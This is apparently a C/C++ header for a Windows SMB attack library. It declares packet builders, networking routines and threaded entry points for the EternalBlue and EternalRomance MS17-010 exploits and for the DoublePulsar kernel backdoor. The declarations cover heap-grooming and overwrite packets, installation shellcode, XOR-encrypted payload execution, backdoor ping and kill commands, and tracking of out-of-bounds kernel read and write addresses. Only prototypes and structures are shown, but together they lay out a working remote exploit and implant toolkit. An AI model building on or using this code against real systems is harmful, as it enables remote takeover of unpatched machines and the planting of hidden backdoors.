#pragma once
#ifndef UNICODE
#define UNICODE
#endif

//define this to include <intrin.h> intrinsic (Assembly Language functionscalled from C/C++)
#ifndef INCLUDE_INTRINSICS
#define INCLUDE_INTRINSICS		1
#endif // !INCLUDE_INTRINSICS



#include "treeconnectandx.h"
#include <Windows.h>
#include <winternl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>
#include <wincrypt.h>

#ifdef INCLUDE_INTRINSICS
#include <intrin.h>
#endif // INCLUDE_INTRINSICS

#include "ntcreateandx.h"
#include "smbpacketstrings.h"
#include "smb_echo.h"

#pragma intrinsic(memcpy, memset, memcmp)

#pragma pack(push, 1)

typedef struct _SMB_HEADER {
	BYTE Protocol[4];
	BYTE Command;
	union {
		struct {
			BYTE ErrorClass;
			BYTE Reserved;
			WORD Error;
		}DosError;
		DWORD NtStatus;
	}Status;
	BYTE Flags;
	WORD Flags2;
	union {
		WORD Reserved[6];
		struct {
			WORD PidHigh;
			union {
				struct {
					DWORD Key;
					WORD Sid;
					WORD SequenceNumber;
					WORD Gid;
				};
				BYTE SecuritySignature[8];
			};
		};
	};
	WORD Tid;
	WORD Pid;
	WORD Uid;
	WORD Mid;
}SMB_HEADER, * PSMB_HEADER;

#pragma pack(pop)

struct smb_info {
	WORD fid;
	WORD tid;
	WORD pid;
	WORD uid;
	WORD mid;
	WORD special_mid;
	WORD special_pid;
	WORD DataDisplacement;
	UNICODE_STRING tree_connection;
	STRING tree_connect_andx_svc;
	BYTE AndxCommand;
	WORD AndxOffset;
	PVOID sockaddrpointer;
	PVOID socketpointer;
	PVOID wsapointer;
	DWORD_PTR connection_handle;
	DWORD srv_last_error;
	BYTE headerinfo[32];
	BOOL DoublePulsarInstalled;
	DWORD DoublePulsarXorKey;
	WORD TransIndataShiftCount;
	WORD TransFragTagOffset;
	WORD TransConnectionOffset;
	ULONG_PTR LastOOBReadAddress;
	ULONG_PTR LastOOBWriteAddress;
	STRING AttackingIPAddress;
};

typedef struct BUFFER {
	DWORD dwsize;
	PBYTE pbdata;
}BUFWITHSIZE, * PBUFWITHSIZE;

struct LeakedDataLinkedList {
	BUFFER  KrnlLeakResponse;
	PDWORD ResponseNetbios;
	PSMB_HEADER ResponseHeader;
	PBYTE ResponseParameters;
	PBYTE ResponseData;
	LeakedDataLinkedList* NextEntry;
};

struct ResponsePacketLinkedList {
	BUFFER ThisPacket;
	PSMB_HEADER ThisSmb;
	PVOID ThisNetbiosSize;	//(WORD *)
	ResponsePacketLinkedList* NextEntry;
};

struct RequestPacketLinkedList {
	BUFFER ThisPacket;
	PSMB_HEADER ThisSmb;
	PVOID ThisNetbiosSize;	//(WORD *)
	RequestPacketLinkedList* NextEntry;
};


#pragma pack(push, 1)

typedef struct ANYPOINTER {
	union {
		PVOID pvpointer;
		PBYTE pbpointer;
		PSTR ppointer;
		PWSTR pwpointer;
		ULONG_PTR address;
		ULONG_PTR* paddress;
		BYTE addressbytes[sizeof(PVOID)];
	};
}*PANYPOINTER;

typedef struct ANYTRANSACTION{
	union {
		ULONG_PTR address;
		PBYTE pbpointer;
		PVOID pvpointer;
		PREQ_TRANSACTION trans;
		PREQ_TRANSACTION2 trans2;
		PREQ_TRANSACTION_SECONDARY transsecondary;
		PREQ_TRANSACTION2_SECONDARY trans2secondary;
		PREQ_NT_TRANSACTION nttrans;
		PREQ_NT_TRANSACTION_SECONDARY nttranssecondary;
	};
}*PANYTRANSACTION;

typedef struct ANYTRANSACTIONRESPONSE {
	union {
		ULONG_PTR address;
		PBYTE pbpointer;
		PVOID pvpointer;
		PRESP_TRANSACTION trans;
		PRESP_TRANSACTION2 trans2;
		PRESP_TRANSACTION_INTERIM transinterim;
		PRESP_NT_TRANSACTION nttrans;
		PRESP_NT_TRANSACTION_INTERIM nttransinterim;
	};
}*PANYTRANSACTIONRESPONSE;


#pragma pack(pop)

//my in order transaction request doubly linked list structure
typedef struct TRANS_REQUEST_LIST {
	ANYTRANSACTION transaction;
	PSMB_HEADER smb;
	DWORD dwsmbcommand;
	DWORD transactionfunction;
	TRANS_REQUEST_LIST* Flink;
	TRANS_REQUEST_LIST* Blink;
}*PTRANS_REQUEST_LIST;

//in order transaction response (doubly) linked list
typedef struct TRANS_RESPONSE_LIST {
	ANYTRANSACTIONRESPONSE transaction;
	PSMB_HEADER smb;
	DWORD dwsmbcommand;
	DWORD transactionfunction;
	TRANS_RESPONSE_LIST* Flink;
	TRANS_RESPONSE_LIST* Blink;
}*PTRANS_RESPONSE_LIST;



typedef PBYTE(*packet_creation_handler_type_one)(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
typedef PBYTE(*packet_creation_handler_type_two)(BUFFER IN OUT* bws, UNICODE_STRING* unc, WORD pid, WORD uid, WORD mid, WORD tid);
typedef PBYTE(*packet_creation_handler_type_three)(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid, WORD IN DataDisplacement);
typedef PBYTE(*packet_creation_handler_type_four)(BUFFER IN OUT* bws, DWORD IN fillcharecter);
typedef PBYTE(*packet_creation_handler_type_five)(BUFFER IN OUT* bws);
typedef PBYTE(*packet_creation_handler_type_six)(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

//this type of function pointer is for reading and writing to a file
typedef BOOLEAN (__stdcall *file_input_output_handler)(UNICODE_STRING* filename, BUFFER* IN OUT filedata);

BOOL __cdecl __memcmp(const void* a, const void* b, DWORD size);

#define cpy(dst, src, size)		(memcpy(dst, src, (size_t)(size)))
#define cmp(a, b, size)			(__memcmp(a, b, size))
#define bzero(ptr, size)		(memset((ptr), 0x00, (size_t)(size)))

HMODULE __stdcall SmbLibraryInitialize(void);
void __stdcall SmbLibraryRelease(void);


BOOL find_memory_pattern(BUFFER IN* bws, PANYPOINTER IN OUT result, const void* IN pattern, DWORD IN patternsize);
VOID update_smb_info(smb_info* info, BUFFER* IN newpacket);
void csprng(PBYTE buffer, DWORD size);
unsigned int random(void);

DWORD __stdcall FindLeakedTrans2DispatchTable(BUFFER IN* bws);
DWORD __stdcall GetDoublePulsarStatusCode(BUFFER* IN bws, BUFFER IN* request);
DWORD __stdcall GetDoublePulsarOpCode(BUFFER* IN bws);
BOOL __stdcall GenerateDoublePulsarOpcodePacket(BUFFER* IN OUT bws, BYTE opcode);
DWORD __stdcall GetDoublePulsarXorKey(BUFFER* IN bws);
ULONG_PTR __stdcall GetOOBWriteAddress(BUFFER* IN packet);
ULONG_PTR** __stdcall GetAllOOBReadAddressesFromMultiRequest(BUFFER* IN packet, DWORD IN smbcount);
DWORD __stdcall FindLeakedDataFragTag(BUFFER IN* packet);

BOOL __stdcall XorEncryptPayload(BUFFER IN OUT* payload, DWORD IN xorkey);


/*
 *
 *
 *	memory allocation buffer with size functions
 *
 *
 */

void bwsalloc(BUFFER OUT* bws, DWORD IN size);
void bwsfree(BUFFER IN* bws);

/*
 *
 *
 *	Linked list functions
 *
 *
 */

void __stdcall FreeRequestLinkedListBuffers(RequestPacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount);
void __stdcall FreeResponseLinkedListBuffers(ResponsePacketLinkedList* IN OUT liststart, DWORD* IN ListElementCount);
void __stdcall FreeLeakdataLinkedListBuffers(LeakedDataLinkedList* IN OUT liststart, DWORD* IN ListElementCount);
void __stdcall FreeRequestLinkedListSingleEntry(RequestPacketLinkedList* IN OUT entrypointer);
void __stdcall FreeResponseLinkedListSingleEntry(ResponsePacketLinkedList* IN OUT entry);

BOOL __stdcall AllocateAndSetupTransactionRequestList(TRANS_REQUEST_LIST** IN OUT liststart, DWORD numberofentries);
BOOL __stdcall FreeTransactionRequestList(TRANS_REQUEST_LIST** IN OUT liststart);
BOOL __stdcall FillInTransactionRequestListEntry(TRANS_REQUEST_LIST* IN OUT translistentry, RequestPacketLinkedList* IN reqentry);

BOOL __stdcall AllocateAndSetupTransactionResponseList(TRANS_RESPONSE_LIST** IN OUT liststart, DWORD numberofentries);
BOOL __stdcall FreeTransactionResponseList(TRANS_RESPONSE_LIST** IN OUT liststart);
BOOL __stdcall FillInTransactionResponseListEntry(TRANS_RESPONSE_LIST* IN OUT translistentry, ResponsePacketLinkedList* IN respentry);


BOOL __stdcall AllocateSockets(SOCKET** IN OUT sockarraypointer, DWORD IN count);
BOOL __stdcall FreeSockets(SOCKET* IN sockarray);


/*
 *
 *
 *	STRING functions
 *
 *
 */

void __stdcall InitString(PCSTR IN cstr, STRING* IN OUT str);
void __stdcall FreeString(STRING* IN OUT str);
void __stdcall InitUnicodeString(PCWSTR IN cstr, UNICODE_STRING* IN OUT str);
void __stdcall FreeUnicodeString(UNICODE_STRING* IN OUT str);
void __stdcall ConvertStringToUnicode(STRING* IN s, UNICODE_STRING* IN OUT u);
void __stdcall ConvertUnicodeToString(UNICODE_STRING* IN u, STRING* IN OUT s);
void DumpHex(const void* vdata, DWORD size);

WORD get_pid(smb_info*);
WORD get_uid(smb_info*);
WORD get_mid(smb_info*);
WORD get_tid(smb_info*);
WORD get_fid(smb_info*);
WORD get_special_mid(smb_info*);
WORD get_special_pid(smb_info*);
WORD get_datadisplacement(smb_info*);
void set_pid(smb_info*, WORD);
void set_uid(smb_info*, WORD);
void set_mid(smb_info*, WORD);
void set_tid(smb_info*, WORD);
void set_fid(smb_info*, WORD);
void set_special_mid(smb_info*, WORD);
void set_special_pid(smb_info*, WORD);
void set_datadisplacement(smb_info*, WORD);

/*
 *
 *
 *	networking functions
 *
 *
 */

unsigned int TargetConnect(SOCKET& s, sockaddr_in& sa, WSAData& wsa, const char* targetip, unsigned int& status);
unsigned int SendData(BUFFER IN OUT* bws, SOCKET& s, unsigned int& status);
unsigned int RecvData(BUFFER IN OUT* bws, DWORD IN bufsize, SOCKET& s, unsigned int& status);

/*
 *
 *
 *	begin smb packet creation functions
 *
 *
 */

 /*
  *
  *
  *	EternalRomance packet creation functions
  *
  *
  */

PBYTE negotiate_request_packet(BUFFER* IN OUT bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE session_setup_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE tree_connect_packet(BUFFER IN OUT* bws, UNICODE_STRING* unc, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE nt_trans_first_fea_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE trans2_secondary_fid_zero_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid, WORD DataDisplacement);
PBYTE smb_echo_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid);
PBYTE session_setup_type_two_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE session_setup_type_three_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE fake_smb2_groom_packet(BUFFER IN OUT* bws, DWORD IN fillcharecter);
PBYTE trans2_secondary_fid_zero_eternalblue_overwrite_packet(BUFFER IN OUT* bws, WORD pid, WORD uid, WORD mid, WORD tid, WORD DataDisplacement);

PBYTE doublepulsar_installation_shellcode(BUFFER IN OUT* bws);

/*
 *
 *
 *	DoublePulsar smb packet creation functions
 *
 *
 */

PBYTE trans2_session_setup_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans2_session_setup_dopu_ping(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans2_session_setup_dopu_kill(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE trans2_session_setup_dopu_exec(BUFFER IN OUT* bws, BUFFER IN* xorkeypacket, BUFFER IN* payload, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

PBYTE tree_disconnect_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);
PBYTE logoff_andx_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

PBYTE trans_peek_namedpipe_check_packet(BUFFER IN OUT* bws, WORD IN pid, WORD IN uid, WORD IN mid, WORD IN tid);

/*
 *
 *
 *
 *
 *		Networking Functions
 *
 *
 *
 */

//network send and recieve function prototype 
typedef BOOLEAN(*send_and_recieve_handler_type_one)(RequestPacketLinkedList  IN OUT* outbound, ResponsePacketLinkedList IN OUT* inbound, SOCKET& s, smb_info IN OUT* info);

BOOLEAN SendRecvNegotiate(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvSessionSetupAndx(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvTreeConnectAndx(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info, PCWSTR IN ip);
BOOLEAN SendRecvNtTransFirstFea(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvTrans2SecondaryFidZero(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvEcho(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvSessionSetupTypeTwo(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvGroomFakeSmb2(RequestPacketLinkedList  IN OUT* outbound, ResponsePacketLinkedList IN OUT* inbound, SOCKET& s, smb_info IN OUT* info);

BOOLEAN SendRecvSessionSetupTypeThree(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvTrans2SecondaryFidZeroEternalblueOverwrite(RequestPacketLinkedList  OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);
BOOLEAN SendRecvDoublePulsarInstallationShellcode(RequestPacketLinkedList OUT* outbound, ResponsePacketLinkedList OUT* inbound, SOCKET& s, smb_info* info);


/*
 *
 *
 *
 *	DoublePulsar Networking Functions
 *
 *
 */

BOOLEAN SendRecvTrans2SessionSetup(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTrans2SessionSetupPing(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTrans2SessionSetupKill(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvTrans2SessionSetupExec(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info, BUFFER IN * xorkeypacket, BUFFER IN * payload);
BOOLEAN SendRecvTreeDisconnect(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);
BOOLEAN SendRecvLogoffAndx(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);

/*
 *
 *
 *
 *	Equation Group MS17-10 vulnerability check networking function
 *
 *
 */
 //sends transaction PEEK_NMPIPE request on FID 0 and recieves its response
BOOLEAN SendRecvTransPeekNamedPipeCheck(RequestPacketLinkedList* IN OUT outbound, ResponsePacketLinkedList* IN OUT inbound, SOCKET& IN s, smb_info* IN info);


/*
 *
 *
 *
 *	Threaded Functions
 *
 *
 *
 */


DWORD __stdcall EternalBlueIsVulnerable(PVOID pvip);
DWORD __stdcall DoublePulsarIsInstalled(PVOID pvip);
DWORD __stdcall DoublePulsarExecuteShellcode(PVOID pvip);
DWORD __stdcall DoublePulsarUninstall(PVOID pvip);
DWORD __stdcall EternalBlueExploit(PVOID pvip);

/*
 *
 *
 *
 *
 *	(Imported from SMBLibrary) file I/O functions
 *
 *
 *
 *
 */

BOOLEAN __stdcall readfile(UNICODE_STRING* filename, BUFFER* IN OUT filedata);